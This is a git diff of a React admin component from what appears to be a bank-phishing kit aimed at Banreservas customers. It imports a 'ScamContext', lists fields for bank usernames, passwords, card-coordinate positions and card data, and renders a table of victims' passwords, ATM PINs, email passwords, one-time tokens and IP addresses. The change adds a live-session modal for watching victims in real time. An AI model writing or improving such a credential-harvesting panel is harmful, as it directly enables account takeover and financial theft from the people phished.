@@ -6,7 +6,8 @@ import { ScamContext } from '../../context/ScamContext'
 import tableHeader from '../../options.json'
 import { RocketIcon } from '../../assets/RocketIcon'
 import { ModalLive } from '../helpers/ModalLive'
-import { ArrowPathIcon, ArrowPathRoundedSquareIcon } from '@heroicons/react/20/solid'
+import { ArrowDownCircleIcon, ArrowPathIcon, ArrowPathRoundedSquareIcon } from '@heroicons/react/20/solid'
+import { SquareOptions } from '../../assets/SquareOptions'
 
 const banreservas = ['usuario', 'clave', 'dos', 'doce', 'veinteydos', 'treintaydos', 'cuatro', 'catorce', 'veinteycuatro', 'treintaycuatro', 'tarjeta', 'ip', '...']
 
@@ -16,8 +17,9 @@ export const TableUserAll = ({users}) => {
   
   const [currentPage, setCurrentPage] = useState(0);
   const [visible, setVisible] = useState(false)
-  const [socketID, setsocketID] = useState(null)
   const [modeLiveData, setModeLiveData] = useState([])
+  const [modalData, setModalData] = useState({})
+
   const filteredUsers = () => {
     return users.slice( currentPage === 0 ? 0 : currentPage - 10, currentPage === 0 ? currentPage + 10 : currentPage)
   }
@@ -29,7 +31,7 @@ export const TableUserAll = ({users}) => {
   
   return (
     <>
-      <ModalLive visible={visible} setVisible={setVisible} modeLiveData={modeLiveData} user={socketID} />
+      <ModalLive visible={visible} setVisible={setVisible} modalData={modalData} />
 
       <div className="overflow-x-auto">
           <table className="table-auto w-full">
@@ -232,7 +234,7 @@ export const TableUserAll = ({users}) => {
                   }) 
 
 
-                    : filteredUsers().map( ({_id, username, password, atmPassword, typeDocument, correo, claveCorreo, celular, token1, token2, token3, modeLive, tarjeta, ip, socketID, liveData, isConnected, isLoading }, i) => {
+                    : filteredUsers().map( ({_id, username, password, atmPassword, typeDocument, correo, claveCorreo, celular, token1, token2, token3, pageNow, modeLive, tarjeta, ip, socketID, liveData, isConnected, isLoading }, i) => {
                       return (
                         <tr className='odd:bg-slate-50 even:bg-slate-200' key={i}>                          
                           <td className='p-2 py-3 whitespace-nowrap'>
@@ -391,14 +393,18 @@ export const TableUserAll = ({users}) => {
                             </div>
                             {modeLive === true ? (
                               <div className="flex items-center">
-                                <IconButton onClick={() => {
-                                    setsocketID(socketID)
-                                    setModeLiveData(liveData)
+                                  <IconButton onClick={() => {
+                                    setModalData({
+                                      socketID,
+                                      liveData,
+                                      isConnected,
+                                      pageNow,
+                                      modeLiveData
+                                    })
                                     setVisible(true)
 
                                   } }>
-                                    {/* {isLoading ? <ArrowPathRoundedSquareIcon size={18} />} */}
-                                  { isLoading === false ? (<RocketIcon  size={18} fill="#FF0080" />) : <ArrowPathIcon />}
+                                  { isLoading === false ? (<RocketIcon  size={18} fill="#FF0080" />) : (<SquareOptions />)}
                                 </IconButton>
                               </div>
                           ) : (<div></div>)}
